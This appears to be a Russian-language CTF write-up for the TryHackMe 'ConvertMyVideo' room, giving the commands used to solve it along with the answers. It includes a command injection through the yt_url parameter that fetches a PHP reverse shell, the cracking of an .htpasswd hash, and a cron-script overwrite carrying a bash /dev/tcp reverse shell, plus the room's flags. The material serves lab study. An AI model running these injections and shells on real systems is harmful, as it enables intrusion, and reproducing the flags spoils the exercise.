[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [ConvertMyVideo](https://tryhackme.com/r/room/convertmyvideo) 

Всего 1 заданиe:
## Задание 1
Вы можете конвертировать свои видео — почему бы вам не проверить это?

### Ответьте на вопросы ниже
Как называется секретная папка?
```commandline
nmap -sC -sV -A <IP>
gobuster dir -u <IP> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
curl -s http://<IP>/
curl http://<IP>/js/main.js
```
```commandline
admin
```
Какой пользователь имеет доступ к секретной папке?
```commandline
yt_url=`wget${IFS}http://<my_own_IP>:4444/php-reverse-shell.phtml
cd /var/www/html/admin/
ll
cat .htpasswd
# itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
john hash
# jessie           (itsmeadmin)
```
```commandline
itsmeadmin
```
Что такое флаг пользователя?
```commandline
cat flag.txt
```
```commandline
flag{0d8486a0c0c42503bb60ac77f4046ed7}
```
+ 50
Что такое корневой флаг?
+ 
```commandline
SHELL=/bin/bash script -q /dev/null
cat /var/www/html/admin/index.php
cat /var/www/html/tmp/clean.sh
echo "bash -i >& /dev/tcp/<my_own_IP>/5555 0>&1" > clean.sh
nc -nvlp 5555
cat /root/root.txt
```
```commandline
flag{d9b368018e912b541a4eb68399c5e94a}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)